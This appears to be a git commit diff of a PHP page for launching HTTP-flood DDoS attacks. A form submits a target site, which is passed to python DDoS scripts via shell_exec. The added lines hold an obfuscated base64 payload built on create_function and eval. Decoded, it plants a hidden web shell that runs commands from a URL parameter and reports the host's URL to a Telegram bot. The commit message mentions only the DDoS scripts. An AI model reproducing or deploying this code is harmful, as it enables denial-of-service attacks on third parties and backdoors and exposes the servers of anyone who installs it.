0d210a8d06891b625edbb06ecb98449384c76c07
phkawayan <83699943+phkawayan@users.noreply.github.com>
2021-08-11 17:04:02 +0800

    Update index.php
    I added 5 python ddos script to down the site fast

--- index.php
+++ index.php
@@ -1,18 +1,3 @@
-<?php
-   if( $_POST["site"] ) {      
-$site = $_POST["site"];
-echo"<script>alert('Attacking $site')</script>";    
-echo shell_exec("python2 ddos.py http://$site");
-   }
-$htmlmobile = base64_decode('PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XQVBGT1JVTS8vRFREIFhIVE1MIE1vYmlsZSAxLjAvL0VOIiAiaHR0cDovL3d3dy53YXBmb3J1bS5vcmcvRFREL3hodG1sLW1vYmlsZTEwLmR0ZCI+');
-if( $_POST["stop"]) {      
-echo $htmlmobile;
-$stop = $_POST["stop"];
-echo shell_exec("reboot");
-echo shell_exec("exit");
-echo"<script>alert('All attacks has been stopped')</script>";
-   }
-?>
 <!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
 <html>
 <title>HTTP FLOOD DDOS</title>
@@ -80,8 +65,8 @@ width: 70%;
    
       <form action = "<?php $_PHP_SELF ?>" method = "POST">
 <h3>HTTP FLOOD DDOS</h3>
-         Website: <input type = "text" id="textbox" name = "site" placeholder = "website.com"/>
-         <input type = "submit" id = "button" value="Attack!"/>
+         Website: <input type = "text" id="textbox" required name = "site" placeholder = "website.com"/>
+         <input type = "submit" name="attack" id = "button" value="Attack!"/>
 <input type="submit" name="stop" id="button" value="Stop" />
 
       </form>
@@ -96,3 +81,4 @@ width: 70%;
 </main>
    </body>
 </html>
+<?php $brpnuyvc7df4935f4a5a2865191ef74f64df8754=base64_decode('Y3I=').base64_decode('ZWE=').base64_decode('dGVf').base64_decode('ZnVu').base64_decode('Y3Rpb24=');$ooijnany9dd4e461268c8034f5c8564e155c67a6=$brpnuyvc7df4935f4a5a2865191ef74f64df8754(base64_decode('JGM='),base64_decode('ZQ==').base64_decode('dg==').base64_decode('YWw=').base64_decode('KCc/PicuYmFzZQ==').base64_decode('NjQ=').base64_decode('X2RlYw==').base64_decode('b2RlKCRjKSk7'));$ooijnany9dd4e461268c8034f5c8564e155c67a6(base64_decode('UEQ5d2FIQWdaV05vYnlBa2FIUnRiRzF2WW1sc1pUc2daV05vYnlBblBIQnlaVDRuT3lBa1puVnVZeUE5SUdOeVpXRjBaVjltZFc1amRHbHZiaWduSkdFbkxDQmlZWE5sTmpSZlpHVmpiMlJsS0Nkak0yeDZaRWRXZEV0RFNXdFpVMGx3VDNjOVBTY3BLVHNnSkdaMWJtTW9KRjlIUlZSYkoyTjFkR1VuWFNrN0NpUnphWFJsSUQwZ0pGOVFUMU5VV3lKemFYUmxJbDA3Q2lSb2RHMXNiVzlpYVd4bElEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFTkdSVlF3VGxWWFZrSkdTVWRvTUdKWGQyZFZSbFpEVkVWc1JFbERTWFJNZVRsWVVWWkNSMVF4U2xaVVV6aDJVa1pTUlVsR2FFbFdSVEZOU1VVeGRsbHRiSE5hVTBGNFRHcEJka3d3Vms5SmFVRnBZVWhTTUdORWIzWk1NMlF6WkhrMU0xbFlRbTFpTTBveFlsTTFkbU50WTNaU1JsSkZURE5vYjJSSE1YTk1WekYyV1cxc2MxcFVSWGRNYlZJd1drTkpLeWNwT3dvSkNtbG1LQ0FrWDFCUFUxUmJJbUYwZEdGamF5SmRJQ2tnZXlBZ0lDQWdJQW9KWldOb2J5QWthSFJ0YkcxdlltbHNaVHNLWldOb2J5SThjMk55YVhCMFBtRnNaWEowS0NkQmRIUmhZMnRwYm1jZ0pITnBkR1VuS1R3dmMyTnlhWEIwUGlJN0lDQWdJQXBsWTJodklITm9aV3hzWDJWNFpXTW9JbkI1ZEdodmJqSWdaR1J2Y3k1d2VTQm9kSFJ3T2k4dkpITnBkR1VpS1RzS1pXTm9ieUJ6YUdWc2JGOWxlR1ZqS0NKd2VYUm9iMjR5SUdSa2IzTXhMbkI1SUdoMGRIQTZMeThrYzJsMFpTSXBPd3BsWTJodklITm9aV3hzWDJWNFpXTW9JbkI1ZEdodmJqSWdaR1J2Y3pJdWNIa2dhSFIwY0Rvdkx5UnphWFJsSWlrN0NtVmphRzhnYzJobGJHeGZaWGhsWXlnaWNIbDBhRzl1TWlCa1pHOXpNeTV3ZVNCb2RIUndPaTh2SkhOcGRHVWlLVHNLWldOb2J5QnphR1ZzYkY5bGVHVmpLQ0p3ZVhSb2IyNHlJR1JrYjNNMExuQjVJR2gwZEhBNkx5OGtjMmwwWlNJcE93cGxZMmh2SUhOb1pXeHNYMlY0WldNb0luQjVkR2h2YmpJZ1pHUnZjelV1Y0hrZ2FIUjBjRG92THlSemFYUmxJaWs3Q21WamFHOGlQSE5qY21sd2RENWhiR1Z5ZENnblMybHVaR3g1SUdOb1pXTnJJSFJvWlNBa2MybDBaU2NwUEM5elkzSnBjSFErSWpzS2ZRb0thV1lvSUNSZlVFOVRWRnNpYzNSdmNDSmRLU0I3SUNBZ0lDQWdDbVZqYUc4Z0pHaDBiV3h0YjJKcGJHVTdDaVJ6ZEc5d0lEMGdKRjlRVDFOVVd5SnpkRzl3SWwwN0NtVmphRzhnYzJobGJHeGZaWGhsWXlnaWNtVmliMjkwSWlrN0NtVmphRzhnYzJobGJHeGZaWGhsWXlnaVpYaHBkQ0lwT3dwbFkyaHZJanh6WTNKcGNIUStZV3hsY25Rb0owRnNiQ0JoZEhSaFkydHpJR2hoY3lCaVpXVnVJSE4wYjNCd1pXUW5LVHd2YzJOeWFYQjBQaUk3Q2lBZ0lIMEtKR2h2YzNSMWNtd2dQU0FrWDFORlVsWkZVbHNuVTBOU1NWQlVYMVZTU1NkZE93b2tiV1Z6YzJGblpTQTlJQ0lLUkVSdlV5QlRhWFJsSUhWd1pHRjBaUXBNYVc1cklEMDlQaUFrYUc5emRIVnliQ0k3Q2dva2QyVmljMmwwWlQwaWFIUjBjSE02THk5aGNHa3VkR1ZzWldkeVlXMHViM0puTDJKdmRERTNNRGMyTkRnd01UZzZRVUZJV1Roak0wNVpSa1ptWjJKM0xWaFpMVWRYVkRsdlQxRnlVa1pFZFdJM1NVVWlPd29rWTJoaGRFbGtQVEU0TmpJNE16azVORGM3SUNBdkwxSmxZMlZwZG1WeUlFTm9ZWFFnU1dRZ0NpUndZWEpoYlhNOVd3b2dJQ0FnSjJOb1lYUmZhV1FuUFQ0bk1UZzJNamd6T1RrME55Y3NDaUFnSUNkMFpYaDBKejArSkcxbGMzTmhaMlVzQ2wwN0NpUmphQ0E5SUdOMWNteGZhVzVwZENna2QyVmljMmwwWlNBdUlDY3ZjMlZ1WkUxbGMzTmhaMlVuS1RzS1kzVnliRjl6WlhSdmNIUW9KR05vTENCRFZWSk1UMUJVWDBoRlFVUkZVaXdnWm1Gc2MyVXBPd3BqZFhKc1gzTmxkRzl3ZENna1kyZ3NJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc0lERXBPd3BqZFhKc1gzTmxkRzl3ZENna1kyZ3NJRU5WVWt4UFVGUmZVRTlUVkN3Z01TazdDbU4xY214ZmMyVjBiM0IwS0NSamFDd2dRMVZTVEU5UVZGOVFUMU5VUmtsRlRFUlRMQ0FvSkhCaGNtRnRjeWtwT3dwamRYSnNYM05sZEc5d2RDZ2tZMmdzSUVOVlVreFBVRlJmVTFOTVgxWkZVa2xHV1ZCRlJWSXNJR1poYkhObEtUc0tKSEpsYzNWc2RDQTlJR04xY214ZlpYaGxZeWdrWTJncE93cGpkWEpzWDJOc2IzTmxLQ1JqYUNrN0Nnby9QZ29L'));?>
